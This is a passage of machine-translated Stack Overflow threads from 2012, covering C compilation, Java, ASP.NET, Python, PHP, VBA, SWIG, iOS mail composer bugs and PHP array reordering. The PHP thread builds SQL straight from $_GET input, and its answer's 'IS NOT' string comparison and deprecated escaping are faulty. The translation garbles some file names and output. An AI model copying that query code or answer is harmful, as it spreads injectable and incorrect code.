你不应该使用#include "XXX.C"。如果要单独编译。您必须编写一个包含所有要调用的函数的“XXX.h”。

之后，您可以单独编译文件：

```
gcc -c YYY.c -o yyy.o
gcc -c XXX.c -o xxx.o 
```

如果要一次编译和链接：

```
gcc xxx.c yyy.c -o xxx 
```

或者如果你想编译 xxx.c 并使用之前生成的目标文件：

```
gcc xxc.c yyy.o -o xxx 
```

甚至：

```
gcc xxx.o yyy.o -o xxx 
```

在最后一个示例中，gcc 将调用链接器，因为没有要编译的源代码。

但是如果你有两个或三个以上的文件，接下来要检查的是如何使用 Makefile。

例子：

xxx.c:

```
#include "yyy.h"

int x(int a)
{
   return a + 1;
}

int main(int argc, char **argv)
{
   x(1);
   y(2);
   return 0;
} 
```

yyy.c:

```
int y(int b)
{ 
   return b + 2;
} 
```

yyy.h：

```
#pragma once
int y(int b); 
```

可以单独编译：

```
gcc -c yyy.c -o yyy.o
gcc xxx.c yyy.o -o xxx 
```

在本例中，xxx.c 调用定义在 yyy.c 上的函数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T14:49:58.097

不，你不应该使用`#include "XXX.c"`. 只应包含标题；代码文件应该彼此分开编译。

具体如何完成取决于您的编译器，但通常您只需将文件一一列出给编译器，如下所示：

```
gcc main.c helpers.c functions.c 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T14:52:49.373

对于您想要的每个目标文件，您应该有一个 .h （[标头，带有声明](http://en.wikipedia.org/wiki/Header_file)）和（至少，一个）.c （带有实现）文件。

有关头文件的更多信息，请转到[此处](http://gcc.gnu.org/onlinedocs/cpp/Header-Files.html)。

然后你只需要这样做：

```
#include "XXX.h" 
```

包括头文件，而不是 .c 文件！

# java - Mandrill 包装器 API JAVA

> ID：12624106
> 
> 赞同：1
> 
> 时间：2012-09-27T14:47:33.857
> 
> 标签：java, api, mailchimp

我正在 Eclipse 中开发 crm struts Web 应用程序。出于邮寄目的，我创建了 mailchimp 帐户和 mandrill 集成。我找到了第三方包装 api（cribbstechnologies-Java-Mandrill-Wrapper）。从 main 方法执行时，它会给出如下所示的异常。我提供了正确的 API 代码，MandrillHTMLMessage 对象中的所有邮件信息。

```
private BaseMandrillResponse performPostRequest(BaseMandrillRequest request, String serviceMethod, Object responseClass, TypeReference reference) throws RequestFailedException {
    try {
        System.out.println("PostRequest Starts");
        request.setKey(config.getApiKey());
        HttpPost postRequest = new HttpPost(config.getServiceUrl() + serviceMethod);
        String postData = getPostData(request); 
```

......

```
protected String getPostData(BaseMandrillRequest request) throws JsonGenerationException, JsonMappingException, IOException {
        return objectMapper.writeValueAsString(request);
} 
```

objectMapper.writeValueAsString(request) 处的异常；像下面这样的线

```
Exception in thread "main" java.lang.IllegalAccessError: tried to access method org.codehaus.jackson.JsonFactory._getBufferRecycler()Lorg/codehaus/jackson/util/BufferRecycler; from class org.codehaus.jackson.map.ObjectMapper
at org.codehaus.jackson.map.ObjectMapper.writeValueAsString(ObjectMapper.java:1030)
at com.cribbstechnologies.clients.mandrill.request.MandrillRESTRequest.getPostData(MandrillRESTRequest.java:102)
at com.cribbstechnologies.clients.mandrill.request.MandrillRESTRequest.performPostRequest(MandrillRESTRequest.java:47)
at com.cribbstechnologies.clients.mandrill.request.MandrillRESTRequest.postRequest(MandrillRESTRequest.java:38)
at com.cribbstechnologies.clients.mandrill.request.MandrillMessagesRequest.sendMessage(MandrillMessagesRequest.java:33)
at com.cribbstechnologies.clients.mandrill.it.MessagesTest.testSendMessage(MessagesTest.java:86)
at com.cribbstechnologies.clients.mandrill.it.MessagesTest.before(MessagesTest.java:63)
at com.cribbstechnologies.clients.mandrill.it.MessagesTest.beforeClass(MessagesTest.java:56)
at com.cribbstechnologies.clients.mandrill.it.SendMail.main(SendMail.java:9) 
```

如何解决异常。我在谷歌上试过，但没有找到结果。

请任何人帮助我...

提前致谢...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T15:27:40.573

您是否尝试过在 Github 上联系作者？ [https://github.com/cribbstechnologies/Java-Mandrill-Wrapper](https://github.com/cribbstechnologies/Java-Mandrill-Wrapper)

如果图书馆正在运作，我会直接向他们提出问题。从您在此处发布的内容中，我没有足够的上下文直接对其进行故障排除。

如果有任何混淆，还有一些集成测试可能有助于阐明使用情况： [https ://github.com/cribbstechnologies/Java-Mandrill-Wrapper/blob/master/src/test/java/com/cribbstechnologies/clients/ mandrill/request/MandrillUsersRequestTest.java](https://github.com/cribbstechnologies/Java-Mandrill-Wrapper/blob/master/src/test/java/com/cribbstechnologies/clients/mandrill/request/MandrillUsersRequestTest.java)

# asp.net-mvc-3 - 按用户创建搜索过滤器。IsApproved

> ID：12624112
> 
> 赞同：1
> 
> 时间：2012-09-27T14:48:06.300
> 
> 标签：asp.net-mvc-3, asp.net-membership, filtering

我正在创建一个搜索页面，以便按用户名、批准状态以及他们当前是否被锁定来过滤用户。

```
 if (!string.IsNullOrEmpty(filterby))
        {
            int totalRecords;
            if (filterby == "all")
            {
                viewModel.PaginatedUserList = Membership.GetAllUsers(page, pageSize, out totalRecords).ToPaginatedList(page, pageSize, totalRecords, searchterm, filterby);
            }
            else if (!string.IsNullOrEmpty(searchterm))
            {
                string query = searchterm + "%";
                if (filterby == "email")
                {
                    viewModel.PaginatedUserList = Membership.FindUsersByEmail(query, page, pageSize, out totalRecords).ToPaginatedList(page, pageSize, totalRecords, searchterm, filterby);
                }
                else if (filterby == "username")
                {
                    viewModel.PaginatedUserList = Membership.FindUsersByName(query, page, pageSize, out totalRecords).ToPaginatedList(page, pageSize, totalRecords, searchterm, filterby);
                }

                else if (filterby == "approval")
                {
                    viewModel.PaginatedUserList = (PaginatedList<MembershipUser>) Membership.GetAllUsers(page, pageSize, out totalRecords).ToPaginatedList(page, pageSize, totalRecords, searchterm, filterby).Where(x => x.IsApproved == false);
                }
            }
        } 
```

我得到“无法投射'WhereListIterator `1[System.Web.Security.MembershipUser]' to type 'Project.Core.Pagination.PaginatedList`1 [System.Web.Security.MembershipUser]'类型的对象。” 每当我尝试通过批准进行搜索时。由于我仍在学习，我不太确定解决此问题的最佳行动方案。任何帮助，将不胜感激。

# python - 如何在父类的祖先对象上调用函数？

> ID：12624121
> 
> 赞同：0
> 
> 时间：2012-09-27T14:48:35.913
> 
> 标签：python, django

鉴于以下减少了函数的头痛，我将如何在 PrintingTemplate 继承的 utils.PrintingTemplateBase 对象上调用函数？

我还要提到 PrintingTemplateBase 需要使用它自己的一个实例（最接近的是 PrintingTemplate）

```
class PrintingTemplate (utils.PrintingTemplateBase) :

    #  Class used to accumulate lines of data
    #
    class LineData :

        #  Class constructor, optionally passed an existing instance in which case
        #  data is copied.
        #
        def __init__ (self, data = None) :

            self.number_of_panes            = 0
            self.material                   = ''  

    #--------------------------------------------------------------------------
    #
    #  LineData subclass for data coming from CalcGlass
    #
    class LineDataGlass (LineData) :

        def __init__ (self, calc_glass) :

            self.number_of_panes           = calc_glass.calc_component.calc_subitem.item.quantity
            try     : self.material        = calc_glass.glass_unit.workshop_description
            except  : self.material        = 'Undefined glass'

    def __init__(self) :

        utils.PrintingTemplateBase.__init__ (self)
        self.constants      = None 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:11:20.450

Python 不是 Java。

在 Python 中，在另一个类中声明一个类并不会赋予它对父类的任何特殊访问权限。这就是为什么我说几乎没有充分的理由这样做。

如果您需要 LineData 实例来访问 PrintingTemplate 实例，则需要通过将其传递给`__init__`方法或直接在该方法中实例化来为该实例提供对该实例的引用。

# php - 获取两个元素而不是一个

> ID：12624124
> 
> 赞同：0
> 
> 时间：2012-09-27T14:48:48.317
> 
> 标签：php

该表如下所示：

id -- 问题 -- test_name

1 -- 数字 1 -- 预赛

2 -- 数字 2 -- 预赛

3 -- 数字 3 -- 预赛

4 -- 第 4 -- 预赛

1 -- 第 1 -- 期中

2 -- 数字 2 -- 期中

3 -- 第 3 -- 期中

4 -- 第 4 名 -- 期中

首先，数据库中的表格，其中 id 不是自动递增的，而是对于每个主要考试（预科、期中），id 重复为 1、2、3、4，这相当于每个主要考试的问题数。

问题是，当我们只获取 1 个元素时，比如 PRELIM，id = "1"，id = "1" 的 Midterm 也会出现。我如何省略中期？

查询代码：

```
 $id=$_GET['id'];

    $result = mysql_query("SELECT * FROM paper WHERE id = '$id' and test_name='$test_name'"); 
```

我希望你能理解我的问题。

[![在此处输入图像描述](../Images/03d58fd3219b30c45266073fe4b48960.png)](https://i.stack.imgur.com/iQUPX.jpg)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T14:55:42.510

正如 lonesomeday 在评论中所说，我认为这不是很好的设计，但您可以使用 IS NOT 功能而不是您现在拥有的功能，假设 test_name 拥有您正在寻找的值。

```
 $id=mysql_escape_string($_GET['id']);
 $test_name = 'PRELIM';     
 $result = mysql_query("SELECT * FROM paper WHERE id = '$id' and test_name IS NOT '$test_name'"); 
```

否则，您需要发布您的完整表格供我们查看。还要记住 mysql_escape_string 已被贬值，但总比没有好:)

# c - 结构中的指针函数

> ID：12624125
> 
> 赞同：1
> 
> 时间：2012-09-27T14:48:51.720
> 
> 标签：c

我有 4 个文件：

主程序

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "main.h"

int main() {
    struct Fun *fun = (struct Fun*)malloc(sizeof(struct Fun));
    fun->a = 2;
    fun->b = 12;
    fun->Func = Plus();
    int result = fun->Func(fun, 8);
    printf("%d\n", result);
    return 0; } 
```

主文件

```
 #ifndef MAN_H_
    #define MAN_H_

    struct Fun {
        int   a;
        int   b;
        int (*Func)(struct Fun *x,int y);

    }; 
```

头文件.c

```
 #include "header.h"

    int Plus(struct Fun *x, int y) {
        return x->a * x->b + y; }; 
```

头文件.h

```
 #ifndef HEADER_H_
    #define HEADER_H_

    #include "man.h"

    #endif /* HEADER_H_ */ 
```

当我构建时，我收到一个警告：

> ../main.c:12:5：警告：函数“Plus”的隐式声明 [-Wimplicit-function-declaration] ../main.c:12:15：警告：赋值使指针从整数不进行强制转换 [默认启用]

如果我跑，它没有结果。

但是当我将所有代码放到 main.c 并对其进行编辑`fun->Func = Plus();`时，`fun->Func = Plus;`它工作正常：没有警告，结果是 32。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T14:51:56.633

`Plus`您应该为in *header.h*提供函数签名，并在 main.c 中添加`#include "header.h"`一个函数签名，以便在*main.c**中*`Plus`使用该函数时了解该函数。

 *在*header.h*中：

```
int Plus(struct Fun *, int); 
```

如果没有这样的签名，在编译*main.c*时，编译器会对函数做出假设：隐式声明。此隐式声明与实际函数定义不匹配。

此外，更改`fun->Func = Plus();`为`fun->Func = Plus;`仍然是必要的：第一种形式将尝试函数调用的结果分配给您的函数指针，第二种形式是分配函数指针的正确方法。

最后，这可能只是一个剪切/粘贴遗漏，但*main.h*缺少一个`#endif`.*

# python - wget与python时间限制

> ID：12624133
> 
> 赞同：3
> 
> 时间：2012-09-27T14:49:06.460
> 
> 标签：python, wget

我有一个大的 URL 文本文件，我必须通过 wget 下载。我写了一个小python脚本，它基本上循环每个域名并使用wget（os.system（“wget”+URL））下载它们。但问题是，如果远程服务器在连接后没有回复，wget 只会挂起连接。在这种情况下如何设置时间限制？如果远程服务器在连接后没有回复，我想在一段时间后终止 wget。

问候，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T14:55:16.613

使用`--timeout seconds`参数来限制请求的时间。如果需要，您可以更具体并使用`--connect-timeout seconds`。有关详细信息，请参阅[wget 手册](http://www.gnu.org/software/wget/manual/wget.html)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-27T14:55:24.180

您不需要使用外部工具，例如`wget`. 使用内置`urllib2`下载文件。文档可[在此处获得](http://docs.python.org/library/urllib2.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-27T15:27:14.523

您不应该`wget`从 Python 调用二进制文件来执行这样的任务。改用 Python 的可用**HTTP 库**之一，您将获得更好的错误处理和控制。

有`urllib2`（[官方文档](http://docs.python.org/library/urllib2.html)，[缺失手册](http://www.voidspace.org.uk/python/articles/urllib2.shtml)）是标准库的一部分。

但是，我强烈建议改用优秀的[**`requests`**模块](http://docs.python-requests.org)。它有一个非常干净的 API，使简单的任务变得简单，正如他们应该做的那样，但仍然提供了大量的灵活性和细粒度的控制。

使用该`requests`模块，您可以使用关键字参数[指定超时](http://docs.python-requests.org/en/latest/user/quickstart/#timeouts)（以秒为单位），如下所示：`timeout`

```
response = requests.get(url, timeout=0.02) 
```

如果超时，`Timeout`将引发异常，您需要捕获并以任何您喜欢的方式处理它。

```
import requests
from requests.exceptions import Timeout, ConnectionError

TIMEOUT = 0.02

urls = ['http://www.stackoverflow.com',
        'http://www.google.com']

for url in urls:
    try:
        response = requests.get(url, timeout=TIMEOUT)
        print "Got response %s" % response.status_code
        response_body = response.content
    except (ConnectionError, Timeout), e:
        print "Request for %s failed: %s" % (url, e)
        # Handle however you need to ... 
```

样本输出：

```
请求 http://www.stackoverflow.com 失败：请求超时。
对 http://www.google.com 的请求失败：请求超时。

```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-27T14:55:43.947

这似乎不是关于 python 的问题，而是关于如何使用 wget 的问题。在您可能使用的 gnu wget 中，默认重试次数为 20。您可以使用 -t 设置尝试次数，如果文件下载失败，也许 wget -t0 会快速跳过它。或者，您可以使用 -S 标志来获得服务器响应，并让 python 做出适当的反应。但是，对您最有用的选项是 -T 或超时，将其设置为 -T10 使其在十秒后超时并继续。

### 编辑：

如果您所做的只是遍历一个列表并下载一个 URL 列表，我只会使用 wget，这里不需要 python。实际上，您可以在一行中完成

```
awk '{print "wget -t2 -T5 --append-output=wget.log \"" $0 "\""}' listOfUrls | bash 
```

这样做是通过一个 url 列表运行，并调用 wget，其中 wget 尝试下载文件两次，并在终止连接之前等待 5 秒，它还将响应附加到 wget.log，您可以`grep`在最后寻找 404 错误。

# vba - 使用 VBA 访问 Outlook 中的文件夹

> ID：12624135
> 
> 赞同：3
> 
> 时间：2012-09-27T14:49:08.300
> 
> 标签：vba, outlook, livelink

我正在使用以下内容将邮件移动到 Outlook 中的文件夹。

```
Dim chemin() as String

chemin = Split(path, "/")
Set myNameSpace = Application.GetNamespace("MAPI")
Set myFolder = myNameSpace.Folders("LiveLink").Folders("Livelink HQE").Folders("Entreprise").Folders(chemin(1)).Folders(chemin(2)).Folders(chemin(3))

myEntryID = myFolder.EntryID
myEntryID = myFolder.StoreID

objMail.Move myNameSpace.GetFolderFromID(myEntryID, storeID) 
```

一切实际上都在工作。如您所见，该文件夹位于 Livelink 中。而且Livelink服务器实际上响应很慢，我对此无能为力。

我担心的是多次使用 .Folders() 而执行类似 .Folders() 的操作会快很多`.Folders("Livelink/root/folder1/folder2/")`。但这显然不起作用，并且因为 .Folders 命令每次都需要 ping Livelink 服务器，实际上执行这行代码需要整整 10 秒（文件夹越深，到达的时间越长它）。

有没有其他方法可以直接访问 Outlook 中的特定文件夹来移动邮件？我知道每个文件夹（甚至 Livelink 中的文件夹）都有某种 Outlook ID，但我看不到任何使用它的方法。我已经尝试了以下方法，但它还没有工作：

```
Dim folder As MAPIFolder
Dim myNameSpace As Outlook.NameSpace
Set myNameSpace = Application.GetNamespace("MAPI")
Set folder = myNameSpace.GetFolderFromID(target, Application.GetNamespace("MAPI").Folders("LiveLink").storeID) 
```

在执行 GetFolderfromID() 时，这给了我一个错误。var`target`实际上是我要将邮件复制到的文件夹的 EntryID。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:38:18.507

根据官方文档，没有比您正在做的更好的方法了，除非您需要多次查找该文件夹。

MSDN 建议的一个选项是[从文件夹路径获取文件夹对象，](http://msdn.microsoft.com/en-us/library/office/bb177014%28v=office.12%29.aspx)但这基本上与您已经在做的事情相同。

问题是[文件夹对象仅代表“在文件夹树的](http://msdn.microsoft.com/en-us/library/office/bb147608%28v=office.12%29.aspx)**一个级别**的特定子集中表示所有可用的 Outlook 文件夹。”（强调添加）

一种可能的解决方法是使用[NameSpace.GetFolderFromID](http://msdn.microsoft.com/en-us/library/office/ff861238.aspx)，但为此您需要知道`EntryID`，可能还有`StoreID`，这通常意味着无论如何您都必须先找到文件夹。但是您可以保存`EntryID`and`StoreID`以供将来立即调用。

如果您想深入了解如何使用`EntryId`s 和s，请参阅有关[使用 EntryIDs 和 StoreIDs](http://msdn.microsoft.com/en-us/library/office/ff868618.aspx)`StoreID`的开发人员参考。

# java - 如何使用 swig 调用期望来自 Java 的结构数组的 C 函数？

> ID：12624141
> 
> 赞同：0
> 
> 时间：2012-09-27T14:49:28.900
> 
> 标签：java, c, swig

我有一个将结构数组作为参数的 C 函数，我想通过 SWIG 从 Java 调用这个函数，但是关于这个主题的文档似乎很模糊，我找不到任何直接解决的 stackoverflow 问题这个案例。这是一个类似于我想要做的例子：

C头文件：

```
typedef struct {
  int timeToPayment;
  double paymentAmount;
} Payment;
double presentValue(Payment *payments, int nPayments); 
```

Java代码片段：

```
...
Class Payment {
  public int timeToPayment;
  public double paymentAmount;
};
...
Payment[] payments = new Payment[3];
payments[0].timeToPayment = 30;
payments[0].paymentAmount = 1.0;
payments[1].timeToPayment = 60;
payments[1].paymentAmount = 2.0;
payments[2].timeToPayment = 90;
payments[2].paymentAmount = 3.0;
double pv = CLIBRARY.presentValue(payments);
// also acceptable: double pv = CLIBRARY.presentValue(payments, payments.length); 
```

如何实现？

编辑：为了提供更多信息，SWIG 是一项要求，因为它已经用于将更简单的接口合并到同一个 Java 代码库中，并且支持不止一种方法来解决这个问题是不可接受的。此外，C 函数的签名不能更改，并且此示例已极其简化；实际问题涉及多个 C 函数，其签名需要结构数组（在某些情况下是多个不同结构的数组），并且一些结构非常大，所以我真的非常不想将它们分解成等效的数组原始类型。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-30T20:54:54.203

最后，我无法完成这项工作（尽管我并不是说这不可能），并且我在 C 中创建了一个翻译层，在传递它之前将所有内容包装到一个单独的结构中。

# objective-c - MFMailComposeViewController 抛出 viewServiceDidTerminateWithError 并在使用自定义标题字体时退出

> ID：12624151
> 
> 赞同：36
> 
> 时间：2012-09-27T14:49:58.993
> 
> 标签：objective-c, ios, ios6

我遇到了很长一段时间以来遇到的最奇怪的问题……而且我的想法已经用完了。

所以我有一个 MFMailComposeViewController ，它通过点击 UIButton 启动，它启动邮件编写器视图就好了。您会看到我分配的主题，但在 to: 或 body 字段填充之前，窗口会闪烁并消失。它抛出这个错误：

> viewServiceDidTerminateWithError: Error Domain=XPCObjectsErrorDomain Code=2 “操作无法完成。（XPCObjectsErrorDomain 错误 2。）”

现在这是疯狂的部分。如果我切换到另一个也使用 MFMailComposeViewController 的应用程序并启动该应用程序，然后切换回我的应用程序并再次启动邮件编写器，它就可以正常工作。我无法解释。

这似乎只是运行 iOS 6 而*不是*iPhone 5 的手机上的问题。

我四处搜寻，似乎找不到其他遇到同样问题的人。有人有什么建议吗？

我已经链接了 MessageUI.framework，我还发现这在模拟器或设备上不起作用，但是当我还链接 Security.framework 时，它开始在模拟器中工作，但它仍然不起作用在设备上。

我启动 MFMailComposeViewController 的代码如下：

在 .h 文件中

```
#import <MessageUI/MessageUI.h>
#import <MessageUI/MFMailComposeViewController.h> 
```

在 .m 文件中

```
-(void)displayComposerSheet {
MFMailComposeViewController *picker = [[MFMailComposeViewController alloc] init];
picker.mailComposeDelegate = self;

[picker setSubject:@"Support Request"];

// Set up recipients
NSArray *toRecipients = [NSArray arrayWithObject:@"support@domain.com"];

[picker setToRecipients:toRecipients];

// Fill out the email body text
NSString *emailBody = @"\n\nEmail from iOS";
[picker setMessageBody:emailBody isHTML:NO];

[self presentModalViewController:picker animated:YES];
}

// Dismisses the email composition interface when users tap Cancel or Send. Proceeds to update the message field with the result of the operation. 
- (void)mailComposeController:(MFMailComposeViewController*)controller     didFinishWithResult:(MFMailComposeResult)result error:(NSError*)error
{

    [self dismissModalViewControllerAnimated:YES];
} 
```

**更新：** 我想我已经把它缩小到我已经传递给 UINavigationBar 的外观委托的设置。我有它使用自定义字体，如果我将其关闭，它似乎可以工作......但为什么它会在 iPhone5 上工作......

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-01-30T03:17:40.027

将 UITextAttributeFont 的自定义字体设置为 UINavigationBar 外观代理的 titleTestAttributes 会导致 OP 和 MightlyLeader 识别的错误。

# 解决方法代码：

```
// remove the custom nav bar font
NSMutableDictionary* navBarTitleAttributes = [[UINavigationBar appearance] titleTextAttributes].mutableCopy;
UIFont* navBarTitleFont = navBarTitleAttributes[UITextAttributeFont];
navBarTitleAttributes[UITextAttributeFont] = [UIFont systemFontOfSize:navBarTitleFont.pointSize];
[[UINavigationBar appearance] setTitleTextAttributes:navBarTitleAttributes];

// set up and present the MFMailComposeViewController
MFMailComposeViewController *mailComposer = [[MFMailComposeViewController alloc] init];
mailComposer.mailComposeDelegate = self;
[mailComposer setSubject:emailInfo[@"subject"]];
[mailComposer setMessageBody:emailInfo[@"message"] isHTML:YES];
mailComposer.modalTransitionStyle = UIModalTransitionStyleCoverVertical;
[self presentViewController:mailComposer animated:YES completion:^{

    // add the custom navbar font back
    navBarTitleAttributes[UITextAttributeFont] = navBarTitleFont;
    [[UINavigationBar appearance] setTitleTextAttributes:navBarTitleAttributes];
}]; 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-08-08T15:34:38.933

这个问题最近出现在我正在做的一个项目上。我不太喜欢上面的解决方法，所以我创建了以下（可能更简洁）的解决方法：

```
// Implement the custom font for all UINavigationBar items
[[UINavigationBar appearance] setTitleTextAttributes:
@{
    UITextAttributeFont : [UIFont custom_superAwesomeFontWithSize:16.0f],
}];

// Disable the custom font when the NavigationBar is presented in a MFMailComposeViewController
[[UINavigationBar appearanceWhenContainedIn:[MFMailComposeViewController class], nil] setTitleTextAttributes:
 @{
    UITextAttributeFont : [UIFont boldSystemFontOfSize:14.0f],
 }]; 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-11-26T15:55:18.417

我遇到过同样的问题。我已将标题栏的文本属性设置为自定义字体。当我删除自定义字体规范（但将所有其他属性留给自定义值）时，问题就消失了。

我的诊断是自定义字体加载时间过长，并且会触发等待围栏的超时。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-27T17:08:15.010

将其设为 ivar：

```
MFMailComposeViewController *picker 
```

然后在这一行之后：

```
[self dismissModalViewControllerAnimated:YES]; 
```

添加这个：

```
dispatch_async(dispatch_get_main_queue(), ^{ picker = nil; }); 
```

这样选择器的释放直到下一个 runloop 循环才会发生。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-28T09:32:31.887

当我们在自定义 UINavigationBar 中放置小数值时会发生这种情况，例如 `[[UIBarButtonItem appearance] setBackButtonTitlePositionAdjustment:UIOffsetMake(1.5, -1.5) forBarMetrics:UIBarMetricsDefault];` 将偏移值设置为 UIOffsetMake(1.0, -1.0) 并且这将起作用。希望这可以帮助。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-07-18T13:17:25.013

我有同样的问题，但我认为我通过子类化 UINavigationBar 解决了它。我更改了子类的外观而不是 UINavigationBar。

```
[[MYNavigationBar appearance] setTitleTextAttributes:@{
    UITextAttributeFont : [UIFont fontWithName:@"Custom Font" size:25]
}]; 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-03-15T22:42:21.567

dberwick 的解决方法有点工作 - 作曲家不再自动取消自己，并且一旦您关闭消息编辑器，自定义导航栏标题字体设置就会恢复，*但*它不会在消息编辑器本身中显示自定义字体。

我只是讨厌解决方法如何使我的实际代码变得臃肿，所以这里有一个简单的方法可以将大部分代码移出：

```
- (void)presentMessageCommposer
    void (^workaroundRestoreFont)(void) = [self ym__workaroundCustomFontInMessageComposer];

    MFMailComposeViewController *mailComposeVC = [MFMailComposeViewController new];
    // ... set up the composer: message body, subject, etc ...
    [self presentViewController:mailComposeVC animated:YES completion:workaroundRestoreFont];
}

// ugly workaround stuff
// move this to the bottom of your class, collapse it, or put it in a category
- (void (^)(void))ym__workaroundCustomFontInMessageComposer
{
    // Bug http://openradar.appspot.com/13422715
    // remove the custom nav bar font
    NSMutableDictionary* navBarTitleAttributes = [[UINavigationBar appearance] titleTextAttributes].mutableCopy;
    UIFont *navBarTitleFont = navBarTitleAttributes[UITextAttributeFont];
    navBarTitleAttributes[UITextAttributeFont] = [UIFont systemFontOfSize:navBarTitleFont.pointSize];
    [[UINavigationBar appearance] setTitleTextAttributes:navBarTitleAttributes];

    return ^{
        // add the custom navbar font back
        NSMutableDictionary* navBarTitleAttributes = [[UINavigationBar appearance] titleTextAttributes].mutableCopy;
        navBarTitleAttributes[UITextAttributeFont] = navBarTitleFont;
        [[UINavigationBar appearance] setTitleTextAttributes:navBarTitleAttributes];
    };
} 
```

（这确实应该是对 dberwick 答案的评论，但这不允许有这么多代码。）

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-11-16T16:35:09.423

只需将作曲家添加为 iVar 即可解决我的问题。

MFMailComposeViewController *emailComposer;

* * *

## 回答 #9

> 赞同：-2
> 
> 时间：2013-01-24T20:09:21.503

根据我所读到的，在 iOS 6 中，这已被弃用：

```
[self presentModalViewController:picker animated:YES]; 
```

他们建议使用：

```
[self presentViewController:picker animated:YES completion:nil]; 
```

`didFinishWithResult`与 (in )配对

```
[[controller presentingViewController] dismissViewControllerAnimated:YES completion:nil]; 
```

不幸的是，这只能在模拟器上间歇性地工作......但有时它确实有效！

# php - 将数组元素移动到 PHP 中的新索引

> ID：12624153
> 
> 赞同：47
> 
> 时间：2012-09-27T14:50:03.353
> 
> 标签：php, arrays

我正在寻找一个简单的函数来将数组元素移动到数组中的新位置并重新排序索引，以便序列中没有间隙。它不需要使用关联数组。有人对这个有想法吗？

```
$a = array(
      0 => 'a',
      1 => 'c',
      2 => 'd',
      3 => 'b',
      4 => 'e',
);
print_r(moveElement(3,1))
//should output 
    [ 0 => 'a',
      1 => 'b',
      2 => 'c',
      3 => 'd',
      4 => 'e' ] 
```

* * *

## 回答 #1

> 赞同：115
> 
> 时间：2012-09-27T15:03:46.970

正如评论的 2x `array_splice`，甚至不需要重新编号：

```
$array = [
    0 => 'a', 
    1 => 'c', 
    2 => 'd', 
    3 => 'b', 
    4 => 'e',
];

function moveElement(&$array, $a, $b) {
    $out = array_splice($array, $a, 1);
    array_splice($array, $b, 0, $out);
}

moveElement($array, 3, 1); 
```

结果：

```
[
    0 => 'a',
    1 => 'b',
    2 => 'c',
    3 => 'd',
    4 => 'e',
]; 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-03-03T12:37:45.330

hakre 使用两个 array_splice 命令的解决方案不适用于命名数组。被移动元素的键将丢失。

相反，您可以将数组拼接两次并合并这些部分。

```
function moveElement(&$array, $a, $b) {
    $p1 = array_splice($array, $a, 1);
    $p2 = array_splice($array, 0, $b);
    $array = array_merge($p2,$p1,$array);
} 
```

它是如何工作的：

*   第一：从数组中删除/拼接元素
*   第二：在要插入元素的位置将数组拼接成两部分
*   将三个部分合并在一起

例子：

```
$fruits = array(
    'bananas'=>'12', 
    'apples'=>'23',
    'tomatoes'=>'21', 
    'nuts'=>'22',
    'foo'=>'a',
    'bar'=>'b'
);

moveElement($fruits, 1, 3);

// Result
['bananas'=>'12', 'tomatoes'=>'21', 'nuts'=>'22', 'apples'=>'23', 'foo'=>'a', 'bar'=>'b'] 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2020-08-09T17:29:04.333

很多很好的答案。这是一个基于@RubbelDeCatc 答案的简单方法。它的美妙之处在于您只需要知道数组键，而不是它的当前位置（重新定位之前）。

```
/**
 * Reposition an array element by its key.
 *
 * @param array      $array The array being reordered.
 * @param string|int $key They key of the element you want to reposition.
 * @param int        $order The position in the array you want to move the element to. (0 is first)
 *
 * @throws \Exception
 */
function repositionArrayElement(array &$array, $key, int $order): void
{
    if(($a = array_search($key, array_keys($array))) === false){
        throw new \Exception("The {$key} cannot be found in the given array.");
    }
    $p1 = array_splice($array, $a, 1);
    $p2 = array_splice($array, 0, $order);
    $array = array_merge($p2, $p1, $array);
} 
```

直接使用：

```
$fruits = [
    'bananas'=>'12', 
    'apples'=>'23',
    'tomatoes'=>'21', 
    'nuts'=>'22',
    'foo'=>'a',
    'bar'=>'b'
];

repositionArrayElement($fruits, "foo", 1);

var_export($fruits);

/** Returns
array (
  'bananas' => '12',
  'foo' => 'a', <--  Now moved to position #1
  'apples' => '23',
  'tomatoes' => '21',
  'nuts' => '22',
  'bar' => 'b',
)
**/ 
```

也适用于数值数组：

```
$colours = ["green", "blue", "red"];

repositionArrayElement($colours, 2, 0);

var_export($colours);

/** Returns
array (
  0 => 'red', <-- Now moved to position #0
  1 => 'green',
  2 => 'blue',
)
*/ 
```

[演示](https://3v4l.org/1QgKX)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-27T15:11:54.500

PHP 中的数组不是 C 语言中的实际数组，而是关联数组。但是将值从索引移动到另一个索引的方法很简单，并且与 C++ 中的相同：

复制值以移动到临时缓冲区，翻译所有元素以粉碎源位置的空点，并在同一位置释放目标位置的一个点。将备份值放在目标位置。

```
function moveElement ($a , $i , $j)
{
      $tmp =  $a[$i];
      if ($i > $j)
      {
           for ($k = $i; $k > $j; $k--) {
                $a[$k] = $a[$k-1]; 
           }        
      }
      else
      { 
           for ($k = $i; $k < $j; $k++) {
                $a[$k] = $a[$k+1];
           }
      }
      $a[$j] = $tmp;
      return $a;
}

$a = array(0, 1, 2, 3, 4, 5);
print_r($a);

$a = moveElement($a, 1, 4);
echo ('1 ->  4');
print_r($a);

$a = moveElement($a, 5, 0);
echo ('5 ->  0' );
